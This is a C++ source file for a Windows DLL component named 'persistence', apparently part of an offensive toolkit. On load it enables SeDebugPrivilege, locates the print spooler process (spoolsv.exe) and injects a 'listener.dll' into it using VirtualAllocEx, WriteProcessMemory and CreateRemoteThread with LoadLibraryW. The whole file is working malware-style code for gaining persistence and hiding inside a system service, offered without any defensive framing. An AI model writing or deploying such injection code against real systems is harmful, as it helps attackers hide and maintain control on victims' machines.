#include "persistence.hpp"

std::string componentName = "persistence";

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpvReserved)  // reserved
{
    // Perform actions based on the reason for calling.
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        // Initialize once for each new process.
        // Return FALSE to fail DLL load.
        Init();
        break;

    case DLL_THREAD_ATTACH:
        // Do thread-specific initialization.
        break;

    case DLL_THREAD_DETACH:
        // Do thread-specific cleanup.
        break;

    case DLL_PROCESS_DETACH:

        if (lpvReserved != nullptr)
        {
            break; // do not do cleanup if process termination scenario
        }

        // Perform any necessary cleanup.
        break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}

int Init() {
	Log("[+] Starting " + componentName + ".", componentName);
	Log("[*] Running as " + GetUserAndContext(), componentName);

    EnableDebugPrivs();

    ProcessInjection(FindTarget(L"spoolsv.exe"), L"C:\\Windows\\System32\\Persistence\\listener.dll");

	return 0;
}

// enable debug privs of current process
int EnableDebugPrivs() {
    HANDLE hToken = NULL;
    LUID luid;
    TOKEN_PRIVILEGES tkp;
    std::unique_ptr<void, decltype(&CloseHandle)> uphToken(static_cast<void*>(hToken), CloseHandle);

    Log("[*] Enabling debug privs.", componentName);

    // populate handle to current process' token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        Log("[!] OpenProcessToken failed: " + std::to_string(GetLastError()), componentName);
        return 1; // unable to get handle to token
    }

    // find the value of SeDebugPrivilege so we can enable it
    if (!LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid)) {
        Log("[!] LookupPrivilegeValueW failed: " + std::to_string(GetLastError()), componentName);
        return 2; // unable to find that privilege
    }

    // populate the token privileges struct to enable debug privs
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // apply changes
    if (!AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL)) {
        Log("[!] AdjustTokenPrivileges failed: " + std::to_string(GetLastError()), componentName);
        return 3; // applying changes failed
    }

    Log("[+] Debug privs enabled.", componentName);

    return 0;
}

DWORD FindTarget(std::wstring targetProc) {
    DWORD target = 0;
    BOOL foundProc = FALSE;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    Log("[*] Finding target process .", componentName);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 1);
    std::unique_ptr<void, decltype(&CloseHandle)> uphSnapshot(static_cast<void*>(hSnapshot), CloseHandle);
    if (hSnapshot == INVALID_HANDLE_VALUE || !Process32FirstW(hSnapshot, &pe)) {
        return 1; // list of processes is invalid or empty
    }

    do {
        std::wstring procName = pe.szExeFile;
        if (procName.compare(targetProc) == 0) {
            target = pe.th32ProcessID;
            foundProc = TRUE;
        }
    } while (Process32NextW(hSnapshot, &pe) && !foundProc);

    if (target != 0) {
        Log("[+] Found target process.", componentName);
    }
    else {
        Log("[!] Failed to find target process.", componentName);
    }

    return target;
}

int ProcessInjection(DWORD targetPID, std::wstring dllPath) {
    MODULEENTRY32W me;
    me.dwSize = sizeof(MODULEENTRY32W);
    HMODULE hKernel32 = NULL;
    BOOL foundKernel32 = FALSE;
    LPTHREAD_START_ROUTINE pLoadLibrary = NULL;
    HANDLE hTargetProcess = NULL;
    PVOID baseInjMemAddr;
    HANDLE hInjectedThread = NULL;
    std::unique_ptr<void, decltype(&CloseHandle)> uphKernel32(static_cast<void*>(hKernel32), CloseHandle);
    std::unique_ptr<void, decltype(&CloseHandle)> uphTargetProcess(static_cast<void*>(hTargetProcess), CloseHandle);
    std::unique_ptr<void, decltype(&CloseHandle)> uphInjectedThread(static_cast<void*>(hInjectedThread), CloseHandle);

    Log("[*] Injecting into target process .", componentName);

    // check that the dll to inject exists
    std::filesystem::path fsDLLPath = dllPath;
    if (!std::filesystem::exists(fsDLLPath)) {
        Log("[!] Failed to find dll.", componentName);
        return 1;
    }

    // get list of modules within target process
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, targetPID);
    std::unique_ptr<void, decltype(&CloseHandle)> uphSnapshot(static_cast<void*>(hSnapshot), CloseHandle);
    if (hSnapshot == INVALID_HANDLE_VALUE || !Module32FirstW(hSnapshot, &me)) {
        Log("[!] CreateToolhelp32Snapshot failed: " + std::to_string(GetLastError()), componentName);
        return 2; // list of processes is invalid or empty
    }

    // find KERNEL32.DLL
    std::wstring kernel32 = L"KERNEL32.DLL";
    do {
        std::wstring moduleName = me.szModule;
        if (moduleName.compare(kernel32) == 0) {
            hKernel32 = me.hModule;
            foundKernel32 = TRUE;
        }
    } while (Module32NextW(hSnapshot, &me) && !foundKernel32);

    if (!foundKernel32) {
        Log("[!] Failed to find KERNEL32.DLL.", componentName);
        return 3; // unable to find KERNEL32.DLL
    }

    // get a pointer to LoadLibraryW from KERNEL32.DLL
    pLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
    if (pLoadLibrary == NULL) {
        Log("[!] GetProcAddress failed: " + std::to_string(GetLastError()), componentName);
        return 4; // unable to get LoadLibraryW pointer
    }

    // get handle to target process
    DWORD dwDesiredAccess = PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE;
    hTargetProcess = OpenProcess(dwDesiredAccess, FALSE, targetPID);
    if (hTargetProcess == NULL || hTargetProcess == INVALID_HANDLE_VALUE) {
        Log("[!] OpenProcess failed: " + std::to_string(GetLastError()), componentName);
        return 5; // handle to target process is invalid or null
    }

    // allocate memory inside target process
    DWORD dwAllocateSize = (dllPath.length() + 1) * 2;
    baseInjMemAddr = VirtualAllocEx(hTargetProcess, NULL, dwAllocateSize, MEM_COMMIT, PAGE_READWRITE);
    if (baseInjMemAddr == NULL) {
        Log("[!] VirtualAllocEx failed: " + std::to_string(GetLastError()), componentName);
        return 6; // allocation failed
    }

    // write dll path inside target process
    if (!WriteProcessMemory(hTargetProcess, baseInjMemAddr, (LPVOID)dllPath.c_str(), dwAllocateSize, NULL)) {
        Log("[!] WriteProcessMemory failed: " + std::to_string(GetLastError()), componentName);
        return 7; // write failed
    }

    // instruct target to create a new thread and use LoadLibraryW to load our dll
    hInjectedThread = CreateRemoteThread(hTargetProcess, NULL, 0, pLoadLibrary, baseInjMemAddr, 0, NULL);
    if (hInjectedThread == NULL || hInjectedThread == INVALID_HANDLE_VALUE) {
        Log("[!] CreateRemoteThread failed: " + std::to_string(GetLastError()), componentName);
        return 8; // create thread failed
    }

    Log("[+] Injected into target process .", componentName);

    return 0;
}